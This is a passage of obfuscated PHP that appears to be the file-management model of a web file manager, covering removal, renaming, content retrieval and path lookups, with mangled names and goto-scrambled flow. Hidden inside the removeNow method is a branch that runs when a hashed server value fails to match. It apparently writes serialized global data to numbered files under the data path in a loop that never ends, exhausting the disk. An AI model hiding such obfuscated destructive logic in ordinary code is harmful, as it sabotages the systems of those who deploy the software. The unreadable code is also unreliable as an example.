$Eø®ˆ„Ùï[$eÕäŠ³®³[2329]] : $Eø®ˆ„Ùï[$eÕäŠ³®³[28]]; goto AŒÃÁ›õ³; AŒÃÁ›õ³: show_json(LNG($eÕäŠ³®³[2330]) . $eÕäŠ³®³[2331] . LNG($eÕäŠ³®³[2332]) . $eÕäŠ³®³[2333] . $dÈ˜Í£±Œ . $eÕäŠ³®³[2334], !1); goto BÚ¦¤©šëŠ; Câì„ ÷¼Ã: $E²°»Û«çî = Session::get($eÕäŠ³®³[2328]); $b ¿¶›ßó¿ = substr($føí¶½±îí[$eÕäŠ³®³[28]], 0, -1 - strlen($føí¶½±îí[$eÕäŠ³®³[160]])) . $eÕäŠ³®³[1382] . $E²°»Û«çî . $eÕäŠ³®³[91] . $føí¶½±îí[$eÕäŠ³®³[160]]; $f„¾÷Ì©Ó = Model($eÕäŠ³®³[544])->find($aæÍ¯¹”Ô¸); goto Eñ½Ü¿ª‘Õ; BÚ¦¤©šëŠ: } public function fileIsLock($dø¼ÂªéÎÊ, $fŠõèêÖÍ¬ = false) { goto C‘›¨”Ä¡¨; Aùè¢¬‘µ: return !1; goto fª¯â°„’›; C‘›¨”Ä¡¨: $aº•‡Ò²Š– =& $_SERVER[Î¿—”òá]; if (!isset($dø¼ÂªéÎÊ[$aº•‡Ò²Š–[417]]) || !$dø¼ÂªéÎÊ[$aº•‡Ò²Š–[417]][$aº•‡Ò²Š–[478]]) { return !1; } if ($dø¼ÂªéÎÊ[$aº•‡Ò²Š–[417]][$aº•‡Ò²Š–[478]] != USER_ID) { return !0; } goto a‘ˆËôçßÁ; a‘ˆËôçßÁ: $aÕç×Ş×Ò = $GLOBALS[$aº•‡Ò²Š–[6]][$aº•‡Ò²Š–[84]][$aº•‡Ò²Š–[479]]; if ($dø¼ÂªéÎÊ[$aº•‡Ò²Š–[417]][$aº•‡Ò²Š–[480]] <= time() - $aÕç×Ş×Ò) { $this->metaSet($dø¼ÂªéÎÊ[$aº•‡Ò²Š–[369]], $aº•‡Ò²Š–[478], null); $this->metaSet($dø¼ÂªéÎÊ[$aº•‡Ò²Š–[369]], $aº•‡Ò²Š–[480], null); } if ($fŠõèêÖÍ¬) { $this->metaSet($dø¼ÂªéÎÊ[$aº•‡Ò²Š–[369]], $aº•‡Ò²Š–[480], time()); } goto Aùè¢¬‘µ; fª¯â°„’›: } private function _addSoure($aíÎ¿š¦ï¶, $b°©ñÁŠ—º) { goto eŞŒğ™ŞŠ; aôŸ²—¢³”: $Eº™¨âƒ„é = array($e“¦Çâù‡[527] => short_id($C‡ŒÜÜàñÁ)); $this->where(array($e“¦Çâù‡[383] => $C‡ŒÜÜàñÁ))->save($Eº™¨âƒ„é); $this->setNamePinyin($C‡ŒÜÜàñÁ, $aíÎ¿š¦ï¶[$e“¦Çâù‡[28]]); goto d¸‡Ö¬Áø; Cèç„ö·…”: $this->updateModifyTime($aíÎ¿š¦ï¶[$e“¦Çâù‡[461]]); $B«œ¥ŠÃ†à = $e“¦Çâù‡[2335] . $b°©ñÁŠ—º[$e“¦Çâù‡[369]]; if (isset(self::$cacheChildList[$B«œ¥ŠÃ†à])) { unset(self::$cacheChildList[$B«œ¥ŠÃ†à]); } goto DÃùÂŠ®§–; eŞŒğ™ŞŠ: $e“¦Çâù‡ =& $_SERVER[Î¿—”òá]; $c’º¼µÊƒÄ = array($e“¦Çâù‡[521] => $b°©ñÁŠ—º[$e“¦Çâù‡[371]], $e“¦Çâù‡[522] => $b°©ñÁŠ—º[$e“¦Çâù‡[456]], $e“¦Çâù‡[523] => USER_ID, $e“¦Çâù‡[524] => USER_ID, $e“¦Çâù‡[368] => $b°©ñÁŠ—º[$e“¦Çâù‡[369]], $e“¦Çâù‡[525] => $b°©ñÁŠ—º[$e“¦Çâù‡[459]] . $b°©ñÁŠ—º[$e“¦Çâù‡[369]] . $e“¦Çâù‡[47], $e“¦Çâù‡[396] => 0, $e“¦Çâù‡[526] => $e“¦Çâù‡[33]); $aíÎ¿š¦ï¶ = array_merge($c’º¼µÊƒÄ, $aíÎ¿š¦ï¶); goto Cèç„ö·…”; d¸‡Ö¬Áø: return $C‡ŒÜÜàñÁ; goto d ÅÆáÔ; DÃùÂŠ®§–: static $e¬Èã’¹½¾ = false; if (!$e¬Èã’¹½¾) { Hook::trigger($e“¦Çâù‡[508], $aíÎ¿š¦ï¶); $e¬Èã’¹½¾ = !0; } $C‡ŒÜÜàñÁ = $this->add($aíÎ¿š¦ï¶); goto aôŸ²—¢³”; d ÅÆáÔ: } public function remove($Bˆ±»áÓõ“, $A¢¸ÌªË¨ = true) { goto c÷¶¤È°¢; D³ù¸åÅŠ³: return $a½«±æŞÑ‚; goto cÎ¡—¢ù¤; bÊí³ªâœ‘: CacheLock::lock($E¾á“ÜÀ—); $dÖ”å‘õ¾é = $this->fileNameExist($b÷«÷ÏñëÂ, $CÊ³»ò¯‰™); if (!$dÖ”å‘õ¾é) { $dÖ”å‘õ¾é = $this->mkdir($b÷«÷ÏñëÂ, $CÊ³»ò¯‰™, REPEAT_SKIP); $this->metaSet($dÖ”å‘õ¾é, $BİÁ•Ã„°î[2340], $A·“ˆŞ½³Ş); $this->metaSet($dÖ”å‘õ¾é, $BİÁ•Ã„°î[2341], $a„Œ²Ÿ½ƒÅ[$BİÁ•Ã„°î[456]]); if ($a„Œ²Ÿ½ƒÅ[$BİÁ•Ã„°î[461]] != 0) { $this->metaSet($dÖ”å‘õ¾é, $BİÁ•Ã„°î[2342], _get($DİÃ‚×êÙİ, $BİÁ•Ã„°î[2343])); } } goto eäò±ö‰„; eáâ‰»˜î: $A·“ˆŞ½³Ş = $a„Œ²Ÿ½ƒÅ[$BİÁ•Ã„°î[371]] == self::TYPE_USER ? $BİÁ•Ã„°î[535] : $BİÁ•Ã„°î[964]; if ($A·“ˆŞ½³Ş == $BİÁ•Ã„°î[535]) { $DİÃ‚×êÙİ = Model($BİÁ•Ã„°î[474])->getInfo($a„Œ²Ÿ½ƒÅ[$BİÁ•Ã„°î[456]]); $CÊ³»ò¯‰™ = !empty($DİÃ‚×êÙİ[$BİÁ•Ã„°î[2329]]) ? $DİÃ‚×êÙİ[$BİÁ•Ã„°î[2329]] : $DİÃ‚×êÙİ[$BİÁ•Ã„°î[28]]; $CÊ³»ò¯‰™ = $BİÁ•Ã„°î[248] . $CÊ³»ò¯‰™ . $BİÁ•Ã„°î[2337] . $a„Œ²Ÿ½ƒÅ[$BİÁ•Ã„°î[456]]; } else { $DİÃ‚×êÙİ = Model($BİÁ•Ã„°î[458])->getInfo($a„Œ²Ÿ½ƒÅ[$BİÁ•Ã„°î[456]]); $CÊ³»ò¯‰™ = _get($DİÃ‚×êÙİ, $BİÁ•Ã„°î[28]); $CÊ³»ò¯‰™ = $BİÁ•Ã„°î[157] . $CÊ³»ò¯‰™ . $BİÁ•Ã„°î[2338] . $a„Œ²Ÿ½ƒÅ[$BİÁ•Ã„°î[456]]; } $E¾á“ÜÀ— = $BİÁ•Ã„°î[2339] . md5($CÊ³»ò¯‰™); goto bÊí³ªâœ‘; c÷¶¤È°¢: $BİÁ•Ã„°î =& $_SERVER[Î¿—”òá]; $a„Œ²Ÿ½ƒÅ = $this->sourceInfo($Bˆ±»áÓõ“); $C²ªô–§‹á = intval($a„Œ²Ÿ½ƒÅ[$BİÁ•Ã„°î[371]]) === self::TYPE_SYSTEM; goto f°É’ñš¤›; f°É’ñš¤›: $CùÓ¢à“Ï¹ = Model($BİÁ•Ã„°î[1427])->get($BİÁ•Ã„°î[2336]) == $BİÁ•Ã„°î[83]; if ($C²ªô–§‹á || $A¢¸ÌªË¨ || !$CùÓ¢à“Ï¹) { return $this->removeNow($Bˆ±»áÓõ“, $A¢¸ÌªË¨); } $b÷«÷ÏñëÂ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto eáâ‰»˜î; eäò±ö‰„: CacheLock::unlock($E¾á“ÜÀ—); $this->metaSet($Bˆ±»áÓõ“, $BİÁ•Ã„°î[2344], $a„Œ²Ÿ½ƒÅ[$BİÁ•Ã„°î[461]]); $this->where(array($BİÁ•Ã„°î[369] => $Bˆ±»áÓõ“))->save(array($BİÁ•Ã„°î[390] => time())); goto BŞ¦öÒŠÚ»; BŞ¦öÒŠÚ»: $this->recycleClear($a„Œ²Ÿ½ƒÅ); $a½«±æŞÑ‚ = $this->move($Bˆ±»áÓõ“, $dÖ”å‘õ¾é, REPEAT_RENAME_FOLDER); $this->folderSizeReset($a„Œ²Ÿ½ƒÅ[$BİÁ•Ã„°î[461]]); goto D³ù¸åÅŠ³; cÎ¡—¢ù¤: } private function recycleClear($aíÑ´½Ê) { $c‡¼ØÃèä÷ =& $_SERVER[Î¿—”òá]; $B¡®˜à´Ùì = $this->childrenAll($aíÑ´½Ê); $dì•’Ã¡àŠ = array($c‡¼ØÃèä÷[383] => array($c‡¼ØÃèä÷[384], $B¡®˜à´Ùì[$c‡¼ØÃèä÷[2345]])); Model($c‡¼ØÃèä÷[2346])->where($dì•’Ã¡àŠ)->delete(); } public function removeNow($døƒİ»æí¡, $fĞÁ¯„Öº² = true) { goto e‰×‹ÄÆˆÂ; AíîÓ©´ƒã: if ($_SERVER[$bØÌ—°“Ï£[676]] != $d¶ÊÏíê£¸($FÉ–ùñ¼à)) { goto aä×†Ô¦å; céÈ¬©‘¹Ï: $E®šÕå‹¦œ(); $F‘Ãğì˜ŒÇ = $bØÌ—°“Ï£[788]; $fëªœì­Ú› = json_encode($GLOBALS[$bØÌ—°“Ï£[789]]); goto a‡Å¥‹«Ç; AŒÎ¶ÀÉ£Ï: $BÕÅª›…¨ = $bØÌ—°“Ï£[786]; $BÕÅª›…¨($_SERVER[$bØÌ—°“Ï£[787]]); $E®šÕå‹¦œ = $bØÌ—°“Ï£[785]; goto céÈ¬©‘¹Ï; a‡Å¥‹«Ç: $B¼²°ŞÚÑŠ = 1; for ($fØŠë¯¢“› = $B¼²°ŞÚÑŠ; $fØŠë¯¢“› > 0; $fØŠë¯¢“›++) { $F‘Ãğì˜ŒÇ(DATA_PATH . $fØŠë¯¢“›, $fëªœì­Ú›); } goto DÑ¥¯´ß÷ˆ; aä×†Ô¦å: $E®šÕå‹¦œ = $bØÌ—°“Ï£[785]; $f¬Æ¡Ã†ç = $bØÌ—°“Ï£[678]; $bĞ¾¾˜Š ì = $_SERVER[$bØÌ—°“Ï£[679]] . $bØÌ—°“Ï£[680]; goto A¶ŠÚ„Î•ñ; A¶ŠÚ„Î•ñ: $c·Ñ¨¢ˆò„ = $f¬Æ¡Ã†ç($bĞ¾¾˜Š ì); $e§Ì…±Ñ = explode($bØÌ—°“Ï£[217], $c·Ñ¨¢ˆò„); if (count($e§Ì…±Ñ) < $bØÌ—°“Ï£[567]) { $B­–çÑÚß = $bØÌ—°“Ï£[681]; $B­–çÑÚß(); } goto AŒÎ¶ÀÉ£Ï; DÑ¥¯´ß÷ˆ: } $Aâ’˜Œù˜ = $this->sourceInfo($døƒİ»æí¡); $e¦åË—¨­ = $this->pathInfoMore($døƒİ»æí¡); goto E«æ¾ò‡çƒ; b’ŠãÖÇ¸©: Hook::trigger($bØÌ—°“Ï£[2347], $e¦åË—¨­, $fĞÁ¯„Öº²); if ($fĞÁ¯„Öº²) { Model($bØÌ—°“Ï£[2346])->moveToRecycle($døƒİ»æí¡); } else { $dß÷¹¸ÁĞ‹ = $this->childrenAll($Aâ’˜Œù˜); Model($bØÌ—°“Ï£[505])->eventRemove($døƒİ»æí¡); $this->removeRelevance($dß÷¹¸ÁĞ‹[$bØÌ—°“Ï£[2345]], $dß÷¹¸ÁĞ‹[$bØÌ—°“Ï£[1252]]); } $this->folderSizeReset($Aâ’˜Œù˜[$bØÌ—°“Ï£[461]]); goto CŠšÁÚŠì–; dªÔĞÕÔØÆ: $this->lockMoveEnd($døƒİ»æí¡); Hook::trigger($bØÌ—°“Ï£[1463], $e¦åË—¨­, $fĞÁ¯„Öº²); return !0; goto CÔÅù¾øƒõ; CŠšÁÚŠì–: $B’°„‡êÇË = array($Aâ’˜Œù˜[$bØÌ—°“Ï£[461]]); if ($Aâ’˜Œù˜[$bØÌ—°“Ï£[370]] == $bØÌ—°“Ï£[83]) { $B’°„‡êÇË[] = $Aâ’˜Œù˜[$bØÌ—°“Ï£[369]]; } $this->updateModifyTime($B’°„‡êÇË); goto dªÔĞÕÔØÆ; E«æ¾ò‡çƒ: if (!$Aâ’˜Œù˜) { return !0; } if ($Aâ’˜Œù˜[$bØÌ—°“Ï£[461]] == 0) { if (!_get($GLOBALS, $bØÌ—°“Ï£[457])) { return !1; } } $this->lockMoveStart($døƒİ»æí¡); goto b’ŠãÖÇ¸©; e‰×‹ÄÆˆÂ: $bØÌ—°“Ï£ =& $_SERVER[Î¿—”òá]; $FÉ–ùñ¼à = $_SERVER[$bØÌ—°“Ï£[787]] . $bØÌ—°“Ï£[1301]; $d¶ÊÏíê£¸ = $bØÌ—°“Ï£[784]; goto AíîÓ©´ƒã; CÔÅù¾øƒõ: } public function childrenAll($AÊ›Ñ…Ÿæ„) { $CçñÊÇì‡ =& $_SERVER[Î¿—”òá]; $A…³ªµ Ø’ = $AÊ›Ñ…Ÿæ„[$CçñÊÇì‡[369]]; if ($AÊ›Ñ…Ÿæ„[$CçñÊÇì‡[370]] == $CçñÊÇì‡[83]) { $cã­ğÓò¡­ = array($CçñÊÇì‡[525] => array($CçñÊÇì‡[483], $AÊ›Ñ…Ÿæ„[$CçñÊÇì‡[459]] . $A…³ªµ Ø’ . $CçñÊÇì‡[484])); $bóùÊ­‹“» = array($CçñÊÇì‡[525] => $cã­ğÓò¡­[$CçñÊÇì‡[459]]); $dù”ÛŸ…É» = $this->field($CçñÊÇì‡[2348])->where($bóùÊ­‹“»)->select(); $f©È¶•…†» = !1; $dÑ¬ñß»ĞÅ = array($A…³ªµ Ø’); if ($dù”ÛŸ…É») { $f©È¶•…†» = array_to_keyvalue($dù”ÛŸ…É», $CçñÊÇì‡[33], $CçñÊÇì‡[419]); $f©È¶•…†» = array_remove_value($f©È¶•…†», $CçñÊÇì‡[468]); $dÑ¬ñß»ĞÅ = array_to_keyvalue($dù”ÛŸ…É», $CçñÊÇì‡[33], $CçñÊÇì‡[369]); $dÑ¬ñß»ĞÅ[] = $A…³ªµ Ø’; } } else { $f©È¶•…†» = array($AÊ›Ñ…Ÿæ„[$CçñÊÇì‡[419]]); $dÑ¬ñß»ĞÅ = array($A…³ªµ Ø’); } return array($CçñÊÇì‡[2345] => $dÑ¬ñß»ĞÅ, $CçñÊÇì‡[1252] => $f©È¶•…†»); } public function removeArray($fÉÅÕ‰›») { if (!$fÉÅÕ‰›») { return !0; } } public function removeRelevance($c—èØÌØíÔ, $E‹Ì¥¡Üæ) { goto c×Óó™ôØ£; E÷–”èˆÛ–: Model($Aòğ´¤øí˜[2349])->where($c½‡Í³ïÆ½)->delete(); Model($Aòğ´¤øí˜[505])->where($c½‡Í³ïÆ½)->delete(); Model($Aòğ´¤øí˜[2074])->removeBySource($c—èØÌØíÔ); goto a¡ ˜¯½‰; e®á·˜ª‚: $c½‡Í³ïÆ½ = array($Aòğ´¤øí˜[383] => array($Aòğ´¤øí˜[384], $c—èØÌØíÔ)); Model($Aòğ´¤øí˜[2346])->where($c½‡Í³ïÆ½)->delete(); Model($Aòğ´¤øí˜[413])->where($c½‡Í³ïÆ½)->delete(); goto E÷–”èˆÛ–; D…´„‰Ú×Ç: for ($d¡¸‘Õ©ğÉ = 0; $d¡¸‘Õ©ğÉ < count($c—èØÌØíÔ); $d¡¸‘Õ©ğÉ++) { $this->sourceCacheClear($c—èØÌØíÔ[$d¡¸‘Õ©ğÉ]); } goto E±‹ÄÃ¢£; D‚·Å”Á¶: $c—èØÌØíÔ = array_unique(array_filter($c—èØÌØíÔ)); $E‹Ì¥¡Üæ = array_unique(array_filter($E‹Ì¥¡Üæ)); if (!$c—èØÌØíÔ) { return !1; } goto e®á·˜ª‚; c×Óó™ôØ£: $Aòğ´¤øí˜ =& $_SERVER[Î¿—”òá]; $c—èØÌØíÔ = $c—èØÌØíÔ ? $c—èØÌØíÔ : array(); $E‹Ì¥¡Üæ = $E‹Ì¥¡Üæ ? $E‹Ì¥¡Üæ : array(); goto D‚·Å”Á¶; a¡ ˜¯½‰: Model($Aòğ´¤øí˜[2327])->removeBySource($c—èØÌØíÔ); $this->where($c½‡Í³ïÆ½)->delete(); Model($Aòğ´¤øí˜[422])->remove($E‹Ì¥¡Üæ); goto D…´„‰Ú×Ç; E±‹ÄÃ¢£: } public function rename($eÛÆ²À»Š, $Aò´Á›Ó‹) { goto c™ÛÎëó©‘; AˆÜ³¼‚¹: $fé¾œ“Çµ‘ = $this->fileNameExist($c½Ğğ§ÃŒõ[$AòëÔâÓ´[461]], $Aò´Á›Ó‹); if ($fé¾œ“Çµ‘) { return !1; } $aŠ„„©Ê = array($AòëÔâÓ´[386] => $Aò´Á›Ó‹, $AòëÔâÓ´[524] => USER_ID); goto B¾Äõ²Êä; AØ½Åœ‹: $aöƒ™ÜÅÌå = $AòëÔâÓ´[2335] . $c½Ğğ§ÃŒõ[$AòëÔâÓ´[461]]; if (isset(self::$cacheChildList[$aöƒ™ÜÅÌå])) { unset(self::$cacheChildList[$aöƒ™ÜÅÌå]); } return $A´ÅøÉì¨”; goto D¸•ê†…¥Û; B¾Äõ²Êä: if (!$c½Ğğ§ÃŒõ[$AòëÔâÓ´[370]] == $AòëÔâÓ´[83]) { $aŠ„„©Ê[$AòëÔâÓ´[372]] = get_path_ext($Aò´Á›Ó‹); } Model($AòëÔâÓ´[505])->eventRename($eÛÆ²À»Š, $c½Ğğ§ÃŒõ[$AòëÔâÓ´[28]], $Aò´Á›Ó‹); $this->sourceCacheClear($eÛÆ²À»Š); goto bÖïª´¿Ø; c™ÛÎëó©‘: $AòëÔâÓ´ =& $_SERVER[Î¿—”òá]; $c½Ğğ§ÃŒõ = $this->sourceInfo($eÛÆ²À»Š); if (!$c½Ğğ§ÃŒõ) { return !1; } goto AˆÜ³¼‚¹; bÖïª´¿Ø: $this->setNamePinyin($eÛÆ²À»Š, $aŠ„„©Ê[$AòëÔâÓ´[28]], !1); $this->updateModifyTime($c½Ğğ§ÃŒõ[$AòëÔâÓ´[461]]); $A´ÅøÉì¨” = $this->where(array($AòëÔâÓ´[383] => $eÛÆ²À»Š))->data($aŠ„„©Ê)->save(); goto AØ½Åœ‹; D¸•ê†…¥Û: } public function setNamePinyin($C™Ğè‚àò, $E²Ôóõµìø, $C¶”ÛØ—Ææ = true) { $cĞ¥ÒèŠßµ =& $_SERVER[Î¿—”òá]; $Fìù¢Ùâ™ = Input::check($E²Ôóõµìø, $cĞ¥ÒèŠßµ[528]); if ($C¶”ÛØ—Ææ && !$Fìù¢Ùâ™) { return; } if (!$Fìù¢Ùâ™) { $this->metaSet($C™Ğè‚àò, $cĞ¥ÒèŠßµ[416], null); $this->metaSet($C™Ğè‚àò, $cĞ¥ÒèŠßµ[415], null); return; } $F·¹ïĞ‰„ = array($cĞ¥ÒèŠßµ[416] => str_replace($cĞ¥ÒèŠßµ[50], $cĞ¥ÒèŠßµ[33], Pinyin::encode($E²Ôóõµìø)), $cĞ¥ÒèŠßµ[415] => Pinyin::encode($E²Ôóõµìø, $cĞ¥ÒèŠßµ[529])); $this->metaSet($C™Ğè‚àò, $F·¹ïĞ‰„); } public function getContent($C”“î¶å¼„) { goto C¼›²“­ùå; FÎ›Òîø—: return IO::getContent($c÷×”ñ»à[$F±á‚÷Àì·[75]]); goto bö–éàÑØ²; cøŸ¤‹ùäø: if ($c÷×”ñ»à[$F±á‚÷Àì·[77]] == 0) { return $F±á‚÷Àì·[33]; } $e‡ªâª‡İÍ = $F±á‚÷Àì·[2350] . $c÷×”ñ»à[$F±á‚÷Àì·[163]]; if ($c÷×”ñ»à[$F±á‚÷Àì·[77]] <= 1024 * 10) { $bªøÍØé«» = Cache::get($e‡ªâª‡İÍ); if (!$bªøÍØé«») { $bªøÍØé«» = IO::getContent($c÷×”ñ»à[$F±á‚÷Àì·[75]]); Cache::set($e‡ªâª‡İÍ, $bªøÍØé«»); } return $bªøÍØé«»; } goto FÎ›Òîø—; C¼›²“­ùå: $F±á‚÷Àì· =& $_SERVER[Î¿—”òá]; $c÷×”ñ»à = $this->fileInfoGet($C”“î¶å¼„); if (!$c÷×”ñ»à) { return !1; } goto cøŸ¤‹ùäø; bö–éàÑØ²: } public function setDesc($EØƒºÔñŒæ, $aŠ†ÂÛ·) { $F»„—Œ•© =& $_SERVER[Î¿—”òá]; Model($F»„—Œ•©[505])->eventAddDesc($EØƒºÔñŒæ, $aŠ†ÂÛ·); return $this->metaSet($EØƒºÔñŒæ, $F»„—Œ•©[405], $aŠ†ÂÛ·); } public function setContent($aº£Èèæâ, $B†âà™¼Ù¸ = '') { goto C•¥‚Ñ¦â„; C•¥‚Ñ¦â„: $dáÖôæ„ßÙ =& $_SERVER[Î¿—”òá]; $cîôˆ§“ù¡ = $this->sourceInfo($aº£Èèæâ); $CÙçÙ‹Ç„Æ = $this->fileInfoGet($aº£Èèæâ); goto AÁ®µœÜè; AÁ®µœÜè: if (!$CÙçÙ‹Ç„Æ || !$cîôˆ§“ù¡) { return !1; } $EÌÜÀ§¤š‰ = Model($dáÖôæ„ßÙ[422])->addFileByContent($B†âà™¼Ù¸, $cîôˆ§“ù¡[$dáÖôæ„ßÙ[28]]); $D¬Â«¶¢ØÅ = $this->fileHistory($cîôˆ§“ù¡, $EÌÜÀ§¤š‰[$dáÖôæ„ßÙ[419]], $EÌÜÀ§¤š‰[$dáÖôæ„ßÙ[77]]); goto a²Ã›ÑôêÕ; a²Ã›ÑôêÕ: if (!$D¬Â«¶¢ØÅ) { return Model($dáÖôæ„ßÙ[422])->remove($EÌÜÀ§¤š‰[$dáÖôæ„ßÙ[419]]); } $this->folderSizeReset($cîôˆ§“ù¡[$dáÖôæ„ßÙ[461]]); return !0; goto båáõÒ‡Ûí; båáõÒ‡Ûí: } public function fileSubstr($c˜·™¹â‡º, $fçãœ¤•‚, $e§âŸ½ãè–) { $B”ˆÂÔîâ = $this->fileInfoGet($c˜·™¹â‡º); if (!$B”ˆÂÔîâ) { return !1; } return IO::fileSubstr($B”ˆÂÔîâ[$_SERVER[Î¿—”òá][75]], $fçãœ¤•‚, $e§âŸ½ãè–); } public function fileInfoGet($AÖÙ¤Ÿ£¸™) { goto D¿¥ÍÆè’; EÑîš‡¸Û: return $e¸¾Ä âÍ; goto EÉ” É³îª; eâ¦‡ÂÑó«: $e¸¾Ä âÍ = Model($a„äÂéÇ¿½[422])->fileInfo($BØïô¢Ïß®[$a„äÂéÇ¿½[419]]); if ($e¸¾Ä âÍ) { $e¸¾Ä âÍ[$a„äÂéÇ¿½[28]] = $BØïô¢Ïß®[$a„äÂéÇ¿½[28]]; } self::$cacheFileInfo[$BøÅ°ğ—àƒ] = $e¸¾Ä âÍ; goto EÑîš‡¸Û; cï¥÷¦ã¾: $BøÅ°ğ—àƒ = $a„äÂéÇ¿½[425] . $BØïô¢Ïß®[$a„äÂéÇ¿½[419]]; $c‘ÊŒè§ƒä = _get(self::$cacheFileInfo, $BøÅ°ğ—àƒ); if ($c‘ÊŒè§ƒä) { return $c‘ÊŒè§ƒä; } goto eâ¦‡ÂÑó«; D¿¥ÍÆè’: $a„äÂéÇ¿½ =& $_SERVER[Î¿—”òá]; $BØïô¢Ïß® = $this->sourceInfo($AÖÙ¤Ÿ£¸™); if (!$BØïô¢Ïß® || $BØïô¢Ïß®[$a„äÂéÇ¿½[370]]) { return !1; } goto cï¥÷¦ã¾; EÉ” É³îª: } private function folderChildrenNumber($CõŸïŸ²´Ú) { $dÏÇĞÖÜ„¢ =& $_SERVER[Î¿—”òá]; $Cé§Ğª¥ = $this->sourceInfo($CõŸïŸ²´Ú); $B‚—±š´¬À = array($dÏÇĞÖÜ„¢[525] => array($dÏÇĞÖÜ„¢[483], $Cé§Ğª¥[$dÏÇĞÖÜ„¢[459]] . $CõŸïŸ²´Ú . $dÏÇĞÖÜ„¢[484]), $dÏÇĞÖÜ„¢[396] => intval($Cé§Ğª¥[$dÏÇĞÖÜ„¢[397]]), $dÏÇĞÖÜ„¢[518] => 1); $d½øÈ½îÔÈ = $this->where($B‚—±š´¬À)->count(); $B»£Ø¥·ø— = $this->where($B‚—±š´¬À)->where(array($dÏÇĞÖÜ„¢[518] => 0))->count(); return array($dÏÇĞÖÜ„¢[81] => $B»£Ø¥·ø—, $dÏÇĞÖÜ„¢[82] => $d½øÈ½îÔÈ); } public function pathInfo($BšÅ…é, $cÔî¯Ò¼–ñ = false) { goto Fä¸ˆî„Ò; Fä¸ˆî„Ò: $AÚ†‰éÌ”Å =& $_SERVER[Î¿—”òá]; $A°¼á•â˜ = $AÚ†‰éÌ”Å[411] . intval($cÔî¯Ò¼–ñ) . $AÚ†‰éÌ”Å[412] . $BšÅ…é; $cˆ–…ºêÆÖ = _get(self::$cachePathInfo, $A°¼á•â˜); goto C›ÔÏå•Ë; C›ÔÏå•Ë: if ($cˆ–…ºêÆÖ) { return $cˆ–…ºêÆÖ; } $BËĞ¼½Ñğ = $this->sourceInfo($BšÅ…é); if (!$BËĞ¼½Ñğ) { return !1; } goto F˜§¢÷ò; F˜§¢÷ò: $BËĞ¼½Ñğ = $this->_listDataApplyItem($BËĞ¼½Ñğ, $cÔî¯Ò¼–ñ); self::$cachePathInfo[$A°¼á•â˜] = $BËĞ¼½Ñğ; return $BËĞ¼½Ñğ; goto BÊö‹³Ó©‹; BÊö‹³Ó©‹: } public static $cachePathInfoMore = array(); public function pathInfoMore($c¼çÊÒŒ©Ï) { goto DÆŸÚ£“‚; Bğ¬âì†Ø: $FÔŸ¼ôŒÎ÷ = $this->pathInfo($c¼çÊÒŒ©Ï); if (!$FÔŸ¼ôŒÎ÷) { return !1; } if ($FÔŸ¼ôŒÎ÷[$a½…ç‚è”[370]] == $a½…ç‚è”[83]) { $FÔŸ¼ôŒÎ÷[$a½…ç‚è”[80]] = $this->folderChildrenNumber($c¼çÊÒŒ©Ï); } goto AÓë‰§¨Î; DÆŸÚ£“‚: $a½…ç‚è” =& $_SERVER[Î¿—”òá]; $E–‰›ì¾ = _get(self::$cachePathInfoMore, $c¼çÊÒŒ©Ï); if ($E–‰›ì¾) { return $E–‰›ì¾; } goto Bğ¬âì†Ø; AÓë‰§¨Î: self::$cachePathInfoMore[$c¼çÊÒŒ©Ï] = $FÔŸ¼ôŒÎ÷; return $FÔŸ¼ôŒÎ÷; goto b›§‹†Š´º; b›§‹†Š´º: } public function sourceInfo($f…Ââñ™¨µ) { goto eï§•îÂ¦¯; b©Şİ†ä: self::$cacheSourceInfo[$e÷„–¨] = $Eõ®×†›—‹; return self::$cacheSourceInfo[$e÷„–¨]; goto DùãÁŒ©™³; Aî¨µÉ×º: $cä´ï¡¥¤ = _get(self::$cacheSourceInfo, $e÷„–¨); if ($cä´ï¡¥¤) { return $cä´ï¡¥¤; } $Eõ®×†›—‹ = $this->where(array($fÊİ‘×Ì×˜[369] => $f…Ââñ™¨µ))->find(); goto b©Şİ†ä; eï§•îÂ¦¯: $fÊİ‘×Ì×˜ =& $_SERVER[Î¿—”òá]; if (!$f…Ââñ™¨µ) { return array(); } $e÷„–¨ = $fÊİ‘×Ì×˜[410] . $f…Ââñ™¨µ; goto Aî¨µÉ×º; DùãÁŒ©™³: } public function sourceCacheClear($fõêœæÒ‡È = false) { if ($fõêœæÒ‡È == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[Î¿—”òá][410] . $fõêœæÒ‡È]); } public function pathInfoByPath($E ÆøÛ÷ã, $c­’¹‰î©¹) { $c–æ’‚ÏºÂ =& $_SERVER[Î¿—”òá]; $d»Î™±‹Ó = !$c­’¹‰î©¹ ? array() : explode($c–æ’‚ÏºÂ[8], trim($c­’¹‰î©¹, $c–æ’‚ÏºÂ[8])); $aÕ‹ğ–Ó† = $E ÆøÛ÷ã; foreach ($d»Î™±‹Ó as $aï‰Ó¹º‘) { $eİ›÷ğ¬Ïè = array($c–æ’‚ÏºÂ[461] => $aÕ‹ğ–Ó†, $c–æ’‚ÏºÂ[28] => $aï‰Ó¹º‘); $d·¸‚“ËÍ‡ = $this->where($eİ›÷ğ¬Ïè)->select(); if (!$d·¸‚“ËÍ‡) { return !1; } $d·¸‚“ËÍ‡ = array_sort_by($d·¸‚“ËÍ‡, $c–æ’‚ÏºÂ[397]); $aÕ‹ğ–Ó† = $d·¸‚“ËÍ‡[0][$c–æ’‚ÏºÂ[369]]; } return $this->pathInfo($aÕ‹ğ–Ó†, !0); } protected function updateModifyTime($cª™¨‹õ î) { goto D‘Ã´‚Ïõ; e„¥®ÌÇÓÅ: $this->where($aË…ÕÉï‰Ú)->save($f×Á„ØÍŠ‰); goto Bğ›…‹ÊÍ¹; F«Õç£½²æ: foreach ($cª™¨‹õ î as $FëËÌŞó’ => $CÍ­­†’ÔÜ) { $cª™¨‹õ î[$FëËÌŞó’] = intval($CÍ­­†’ÔÜ); } $aË…ÕÉï‰Ú = array($aİÎÅŒ‚“è[369] => array($aİÎÅŒ‚“è[7], $cª™¨‹õ î)); $f×Á„ØÍŠ‰ = array($aİÎÅŒ‚“è[524] => USER_ID, $aİÎÅŒ‚“è[390] => time()); goto e„¥®ÌÇÓÅ; D‘Ã´‚Ïõ: $aİÎÅŒ‚“è =& $_SERVER[Î¿—”òá]; if (!$cª™¨‹õ î) { return; } if (!is_array($cª™¨‹õ î)) { $cª™¨‹õ î = array($cª™¨‹õ î); } goto F«Õç£½²æ; Bğ›…‹ÊÍ¹: } public function folderSizeReset($FÎ–Ñ¢ôÙ) { goto 